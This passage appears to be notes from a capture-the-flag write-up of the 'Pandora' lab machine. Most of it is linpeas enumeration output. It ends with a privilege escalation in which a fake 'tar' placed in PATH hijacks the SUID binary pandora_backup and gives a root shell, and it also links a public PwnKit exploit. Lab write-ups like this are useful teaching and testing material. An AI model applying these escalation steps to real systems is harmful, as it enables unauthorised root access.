  - /usr/local/lib/x86_64-linux-gnu                                                                                                                          
  - /lib/x86_64-linux-gnu
  - /usr/lib/x86_64-linux-gnu

/etc/ld.so.preload
╔══════════╣ Capabilities                                                                                                                                    
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities                                                                              
══╣ Current shell capabilities                                                                                                                               
CapInh:  0x0000000000000000=                                                                                                                                 
CapPrm:  0x0000000000000000=
CapEff:  0x0000000000000000=
CapBnd:  0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
CapAmb:  0x0000000000000000=

══╣ Parent process capabilities
CapInh:  0x0000000000000000=                                                                                                                                 
CapPrm:  0x0000000000000000=
CapEff:  0x0000000000000000=
CapBnd:  0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
CapAmb:  0x0000000000000000=


Files with capabilities (limited to 50):
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/ping = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep

╔══════════╣ Users with capabilities
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities                                                                              
                                                                                                                                                             
╔══════════╣ AppArmor binary profiles
-rw-r--r-- 1 root root 3222 Mar 11  2020 sbin.dhclient                                                                                                       
-rw-r--r-- 1 root root 3202 Feb 25  2020 usr.bin.man
-rw-r--r-- 1 root root  730 May  9  2021 usr.sbin.mysqld
-rw-r--r-- 1 root root 1575 Feb 11  2020 usr.sbin.rsyslogd
-rw-r--r-- 1 root root 1385 Dec  7  2019 usr.sbin.tcpdump

╔══════════╣ Files with ACLs (limited to 50)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#acls                                                                                      
files with acls in searched folders Not Found                                                                                                                
                                                                                                                                                             
╔══════════╣ Files (scripts) in /etc/profile.d/
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#profiles-files                                                                            
total 32                                                                                                                                                     
drwxr-xr-x   2 root root 4096 Dec  7  2021 .
drwxr-xr-x 105 root root 4096 Jan  3  2022 ..
-rw-r--r--   1 root root   96 Dec  5  2019 01-locale-fix.sh
-rw-r--r--   1 root root 1557 Feb 17  2020 Z97-byobu.sh
-rw-r--r--   1 root root  729 Feb  2  2020 bash_completion.sh
-rw-r--r--   1 root root 1003 Aug 13  2019 cedilla-portuguese.sh
-rw-r--r--   1 root root 1107 Nov  3  2019 gawk.csh
-rw-r--r--   1 root root  757 Nov  3  2019 gawk.sh

╔══════════╣ Permissions in init, init.d, systemd, and rc.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#init-init-d-systemd-and-rc-d                                                              
                                                                                                                                                             
═╣ Hashes inside passwd file? ........... No
═╣ Writable passwd file? ................ No                                                                                                                 
═╣ Credentials in fstab/mtab? ........... No                                                                                                                 
═╣ Can I read shadow files? ............. No                                                                                                                 
═╣ Can I read shadow plists? ............ No                                                                                                                 
═╣ Can I write shadow plists? ........... No                                                                                                                 
═╣ Can I read opasswd file? ............. No                                                                                                                 
═╣ Can I write in network-scripts? ...... No                                                                                                                 
═╣ Can I read root folder? .............. No                                                                                                                 
                                                                                                                                                             
╔══════════╣ Searching root files in home dirs (limit 30)
/home/                                                                                                                                                       
/home/matt/user.txt
/root/
/var/www
/var/www/html
/var/www/html/assets
/var/www/html/assets/js
/var/www/html/assets/js/wow.min.js
/var/www/html/assets/js/main.js
/var/www/html/assets/js/bootstrap.bundle.min.js
/var/www/html/assets/css
/var/www/html/assets/css/ud-styles.css.map
/var/www/html/assets/css/animate.css
/var/www/html/assets/css/bootstrap.min.css
/var/www/html/assets/css/ud-styles.css
/var/www/html/assets/css/lineicons.css
/var/www/html/assets/images
/var/www/html/assets/images/404
/var/www/html/assets/images/404/shape-1.svg
/var/www/html/assets/images/404/dotted-shape.svg
/var/www/html/assets/images/404/shape-2.svg
/var/www/html/assets/images/team
/var/www/html/assets/images/team/team-04.png
/var/www/html/assets/images/team/dotted-shape.svg
/var/www/html/assets/images/team/shape-2.svg
/var/www/html/assets/images/team/team-02.png
/var/www/html/assets/images/team/team-03.png
/var/www/html/assets/images/team/team-01.png
/var/www/html/assets/images/faq
/var/www/html/assets/images/faq/shape.svg

╔══════════╣ Searching folders owned by me containing others files on it (limit 100)
-rw-r----- 1 root matt 33 Dec 14 14:11 /home/matt/user.txt                                                                                                   

╔══════════╣ Readable files belonging to root and readable by me but not world readable
-rwsr-x--- 1 root matt 16816 Dec  3  2021 /usr/bin/pandora_backup                                                                                            
-rw-r----- 1 root matt 33 Dec 14 14:11 /home/matt/user.txt

╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files                                                                            
/dev/mqueue                                                                                                                                                  
/dev/shm
/home/matt
/run/lock
/run/screen
/tmp
/tmp/tmux-1000
/var/crash
/var/lib/php/sessions
/var/tmp
/var/www/pandora
/var/www/pandora/index.html
/var/www/pandora/pandora_console
/var/www/pandora/pandora_console/AUTHORS
/var/www/pandora/pandora_console/COPYING
/var/www/pandora/pandora_console/DB_Dockerfile
/var/www/pandora/pandora_console/DEBIAN
/var/www/pandora/pandora_console/DEBIAN/conffiles
/var/www/pandora/pandora_console/DEBIAN/control
/var/www/pandora/pandora_console/DEBIAN/make_deb_package.sh
/var/www/pandora/pandora_console/DEBIAN/md5sums
/var/www/pandora/pandora_console/DEBIAN/postinst
/var/www/pandora/pandora_console/Dockerfile
/var/www/pandora/pandora_console/ajax.php
/var/www/pandora/pandora_console/attachment
/var/www/pandora/pandora_console/attachment/.cron.supervisor.servers.idx
/var/www/pandora/pandora_console/attachment/.htaccess
/var/www/pandora/pandora_console/attachment/downloads
/var/www/pandora/pandora_console/attachment/downloads/.gitignore
/var/www/pandora/pandora_console/attachment/files_repo
/var/www/pandora/pandora_console/attachment/index.html
/var/www/pandora/pandora_console/attachment/mibs
/var/www/pandora/pandora_console/attachment/mibs/index.html
/var/www/pandora/pandora_console/attachment/pandora_chat.global_counter.txt
/var/www/pandora/pandora_console/attachment/plugin
/var/www/pandora/pandora_console/attachment/plugin/index.html
/var/www/pandora/pandora_console/audit.log
/var/www/pandora/pandora_console/composer.json
/var/www/pandora/pandora_console/composer.lock
/var/www/pandora/pandora_console/docker_entrypoint.sh
/var/www/pandora/pandora_console/extensions
/var/www/pandora/pandora_console/extensions/agents_alerts.php
/var/www/pandora/pandora_console/extensions/agents_modules
/var/www/pandora/pandora_console/extensions/agents_modules.php
/var/www/pandora/pandora_console/extensions/api_checker.php
/var/www/pandora/pandora_console/extensions/db_status.php
#)You_can_write_even_more_files_inside_last_directory

/var/www/pandora/pandora_console/extensions/dbmanager/dbmanager.css
/var/www/pandora/pandora_console/extensions/disabled
/var/www/pandora/pandora_console/extensions/disabled/matrix_events.php
/var/www/pandora/pandora_console/extensions/extension_uploader.php
/var/www/pandora/pandora_console/extensions/files_repo
/var/www/pandora/pandora_console/extensions/files_repo.php
/var/www/pandora/pandora_console/extensions/files_repo/files_repo_form.php
/var/www/pandora/pandora_console/extensions/files_repo/files_repo_get_file.php
/var/www/pandora/pandora_console/extensions/files_repo/files_repo_list.php
/var/www/pandora/pandora_console/extensions/files_repo/functions_files_repo.php
/var/www/pandora/pandora_console/extensions/files_repo/sql
/var/www/pandora/pandora_console/extensions/files_repo/sql/files_repo.oracle.sql
/var/www/pandora/pandora_console/extensions/files_repo/sql/files_repo.postgreSQL.sql
/var/www/pandora/pandora_console/extensions/files_repo/sql/files_repo.sql
/var/www/pandora/pandora_console/extensions/insert_data.php
/var/www/pandora/pandora_console/extensions/matrix_events
/var/www/pandora/pandora_console/extensions/matrix_events/ajax.php
/var/www/pandora/pandora_console/extensions/module_groups
/var/www/pandora/pandora_console/extensions/module_groups.php
/var/www/pandora/pandora_console/extensions/net_tools
/var/www/pandora/pandora_console/e

```


## CVE-2021-4034
#cve_2021-4034 #pwnkit 
https://access.redhat.com/security/cve/cve-2021-4034
https://github.com/berdav/CVE-2021-4034
## suid priv esc
#privilege_escalation #linux #suid
```
matt@pandora:/$ find / -perm -u=s 2>/dev/null
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/pandora_backup
/usr/bin/passwd
/usr/bin/mount
/usr/bin/su
/usr/bin/at
/usr/bin/fusermount
/usr/bin/chsh
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
```

Decompile `/usr/bin/pandora_backup` using ghidra #ghidra which shows the following code in `main` function:
```
iVar1 = system("tar -cvf /root/.backup/pandora-backup.tar.gz /var/www/pandora/pandora_console/*");
```

as `tar` is not called with full path this can abused by adding to PATH
```
$ pwd
/home/matt
$ echo '/bin/bash' > tar
$ export PATH=/home/matt:$PATH
$ /usr/bin/pandora_backup
PandoraFMS Backup Utility
Now attempting to backup PandoraFMS client
root@pandora:~# id
uid=0(root) gid=1000(matt) groups=1000(matt)
```
